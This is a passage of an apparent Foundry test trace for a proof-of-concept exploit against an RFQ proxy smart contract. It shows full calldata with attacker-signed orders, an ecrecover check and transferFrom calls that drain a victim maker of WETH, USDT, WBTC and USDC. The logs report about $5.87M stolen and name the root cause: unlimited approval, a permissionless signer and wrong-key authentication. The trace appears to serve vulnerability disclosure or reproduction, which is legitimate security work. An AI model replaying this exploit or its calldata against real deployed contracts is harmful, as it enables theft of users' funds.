+    │   │   │   │   │   @ 0xe5611bf39b6895f47bca08debbe73baeccee3b3a6818916247c55cf9eb71ca87: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc
+    │   │   │   │   │   @ 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17: 2 → 1
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  emit topic 0: 0x908e04b7fca534332a280849447da5bdff4d19546aff4b134481c5b48993cc8a
+    │   │   │        topic 1: 0x000000000000000000000000c3ebddea4f69df717a8f5c89e7cf20c1c0389100
+    │   │   │        topic 2: 0x8f137d78ca15c264a1745fc50439022feb1d3d120e255e6c53194c86957209a1
+    │   │   │           data: 0x000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000000000000000000000000000000000000000000003
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x14b9ca8fcf7bd3522d17a02a249099965efeab5afb4e0bc17cb8add32fcc9b76: 0 → 0x0000000000000000000000000000000000000000000000000000000080000003
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [71007] RFQ_Proxy::4112e1c2(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000012768ac846f000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001b4a4632981a75d969b349af56527c32e7c153c9e3a0ab6f2342b9ffab6fe099ba2bcba1cc93023924b884ed8855cb015a87b69010ed217f98e3c20433284519230000000000000000000000000000000000000000000000000000000000000002)
+    │   ├─ [70250] 0x88eb28009351Fb414A5746F5d8CA91cdc02760d8::4112e1c2(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000012768ac846f000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000009ba0cf1588e1dfa905ec948f7fe5104dd40eda310000000000000000000000000000000000000000000000000000000069fbe1480000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001b4a4632981a75d969b349af56527c32e7c153c9e3a0ab6f2342b9ffab6fe099ba2bcba1cc93023924b884ed8855cb015a87b69010ed217f98e3c20433284519230000000000000000000000000000000000000000000000000000000000000002) [delegatecall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0xe20514e30312fbc0dbaee682d5fad27cf8b727813a01dce09edb069273eacc37, 27, 33595179277712032538514982595053940628349049353436959069000784817866191968698, 19809239139703241551983794504577679362409439797010255296888287270680429664547) [staticcall]
+    │   │   │   └─ ← [Return] 0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100
+    │   │   ├─ [1164] USDC::fallback() [staticcall]
+    │   │   │   ├─ [381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   │   │   └─ ← [Return] 6
+    │   │   │   └─ ← [Return] 6
+    │   │   ├─ [3142] EACAggregatorProxy::latestRoundData() [staticcall]
+    │   │   │   ├─ [1409] 0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7::latestRoundData() [staticcall]
+    │   │   │   │   └─ ← [Return] 930, 99980000 [9.998e7], 1778054457 [1.778e9], 1778054471 [1.778e9], 930
+    │   │   │   └─ ← [Return] 55340232221128655778 [5.534e19], 99980000 [9.998e7], 1778054457 [1.778e9], 1778054471 [1.778e9], 55340232221128655778 [5.534e19]
+    │   │   ├─ [1164] USDC::fallback() [staticcall]
+    │   │   │   ├─ [381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   │   │   └─ ← [Return] 6
+    │   │   │   └─ ← [Return] 6
+    │   │   ├─ [3142] EACAggregatorProxy::latestRoundData() [staticcall]
+    │   │   │   ├─ [1409] 0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7::latestRoundData() [staticcall]
+    │   │   │   │   └─ ← [Return] 930, 99980000 [9.998e7], 1778054457 [1.778e9], 1778054471 [1.778e9], 930
+    │   │   │   └─ ← [Return] 55340232221128655778 [5.534e19], 99980000 [9.998e7], 1778054457 [1.778e9], 1778054471 [1.778e9], 55340232221128655778 [5.534e19]
+    │   │   ├─ [11349] USDC::fallback(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], 1268771488879 [1.268e12])
+    │   │   │   ├─ [10554] FiatTokenV2_2::transferFrom(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], 1268771488879 [1.268e12]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], to: AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], value: 1268771488879 [1.268e12])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xdc9dbe2f670e24af26fbe3979b15a6bd881b67fab7d0677ad2bf1600f76ac709: 0x0000000000000000000000000000000000000000000000000000012a648f3acc → 0x00000000000000000000000000000000000000000000000000000002fbe2b65d
+    │   │   │   │   │   @ 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17: 1 → 0x0000000000000000000000000000000000000000000000000000012768ac8470
+    │   │   │   │   │   @ 0x377d7c8b40c59d4ac735576ca7cc3a4b551bb77cfadb4619fa388f11624a9aa9: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffed897537b90
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [6549] USDC::fallback(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], 1)
+    │   │   │   ├─ [5754] FiatTokenV2_2::transferFrom(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], 1) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95], to: VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31], value: 1)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xdc9dbe2f670e24af26fbe3979b15a6bd881b67fab7d0677ad2bf1600f76ac709: 0x00000000000000000000000000000000000000000000000000000002fbe2b65d → 0x00000000000000000000000000000000000000000000000000000002fbe2b65e
+    │   │   │   │   │   @ 0xe5611bf39b6895f47bca08debbe73baeccee3b3a6818916247c55cf9eb71ca87: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffb
+    │   │   │   │   │   @ 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17: 0x0000000000000000000000000000000000000000000000000000012768ac8470 → 0x0000000000000000000000000000000000000000000000000000012768ac846f
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  emit topic 0: 0x908e04b7fca534332a280849447da5bdff4d19546aff4b134481c5b48993cc8a
+    │   │   │        topic 1: 0x000000000000000000000000c3ebddea4f69df717a8f5c89e7cf20c1c0389100
+    │   │   │        topic 2: 0xe20514e30312fbc0dbaee682d5fad27cf8b727813a01dce09edb069273eacc37
+    │   │   │           data: 0x000000000000000000000000d4d5db5ec65272b26f756712247281515f211e950000000000000000000000000000000000000000000000000000000000000004
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x4e80f50ebf07fb707859553adcabc404be372bb73d20f9b04c30110ceb41e2d3: 0 → 0x0000000000000000000000000000000000000000000000000000000080000003
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [534] WETH::balanceOf(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [staticcall]
+    │   └─ ← [Return] 1291161105215879179270 [1.291e21]
+    ├─ [1031] USDT::balanceOf(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [staticcall]
+    │   └─ ← [Return] 206282446876 [2.062e11]
+    ├─ [795] WBTC::balanceOf(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [staticcall]
+    │   └─ ← [Return] 1693910519 [1.693e9]
+    ├─ [1339] USDC::fallback(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(AttackContract(taker): [0xD4D5DB5EC65272B26F756712247281515F211E95]) [delegatecall]
+    │   │   └─ ← [Return] 1268771488879 [1.268e12]
+    │   └─ ← [Return] 1268771488879 [1.268e12]
+    ├─ [0] console::log("\n[Bug #2] Attacker-signed orders accepted; victim maker drained.") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Stolen by attack contract:") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  WETH:", 1291161105215879179270 [1.291e21]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  USDT:", 206282446876 [2.062e11]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  WBTC:", 1693910519 [1.693e9]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  USDC:", 1268771488879 [1.268e12]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("\nApprox USD value (round figures): ~$5.87M") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [534] WETH::balanceOf(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31]) [staticcall]
+    │   └─ ← [Return] 13042031365816961407 [1.304e19]
+    ├─ [0] VM::assertApproxEqAbs(13042031365816961407 [1.304e19], 13042031365816961407 [1.304e19], 0, "WETH not drained from maker") [staticcall]
+    │   └─ ← [Return]
+    ├─ [795] WBTC::balanceOf(VictimResolver(maker): [0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31]) [staticcall]
+    │   └─ ← [Return] 17110208 [1.711e7]
+    ├─ [0] VM::assertApproxEqAbs(17110208 [1.711e7], 17110208 [1.711e7], 0, "WBTC not drained from maker") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(1291161105215879179270 [1.291e21], 1291161105215879179270 [1.291e21], "unexpected WETH amount") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(206282446876 [2.062e11], 206282446876 [2.062e11], "unexpected USDT amount") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(1693910519 [1.693e9], 1693910519 [1.693e9], "unexpected WBTC amount") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertGt(1268771488879 [1.268e12], 1268000000000 [1.268e12], "unexpected USDC amount") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] console::log("\nExploit reproduced: unlimited maker approval + permissionless signer + wrong-key auth = full drain.") [staticcall]
+    │   └─ ← [Stop]
+    ├─  storage changes:
+    │   @ 0x5b48999f73186c77868655af6661e8b47dc321b59c68b2c8dd9121b5be6e2f29: 0 → 1
+    │   @ 0x5b48999f73186c77868655af6661e8b47dc321b59c68b2c8dd9121b5be6e2f26: 0 → 0xed15bf036a1bba409ddb8b7096844cdafc6b20005c8100b2aa3d8ad4138d6c17
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 24.31s (23.00s CPU time)
+
+Ran 1 test suite in 29.03s (24.31s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
